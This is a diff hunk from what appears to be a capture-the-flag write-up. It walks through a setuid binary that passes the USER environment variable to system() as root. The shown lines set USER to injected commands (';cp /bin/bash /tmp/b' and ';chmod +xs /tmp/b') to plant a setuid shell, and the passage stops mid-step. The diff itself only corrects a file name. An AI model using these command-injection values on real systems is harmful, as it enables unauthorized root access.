@@ -52,7 +52,7 @@ Open the binary in **ghidra** and we can see something very interesting.
 **USER** env is taken and and **uid** is set to 0 which is **root**. We can see that the **USER** is concatenated to a variable and that is being executed with **system** as **root**. Now we can set **USER** env to to command and we can execute that as root.
 #### export USER=';cp /bin/bash /tmp/b' (*There is a character limit*)
 #### /bin/authenticate
-Exit the shell and check the /tmp, there would be **a** file. Now change the permission
+Exit the shell and check the /tmp, there would be **b** file. Now change the permission
 #### export USER=';chmod +xs /tmp/b'
 #### /bin/authenticate
 Exit and now run
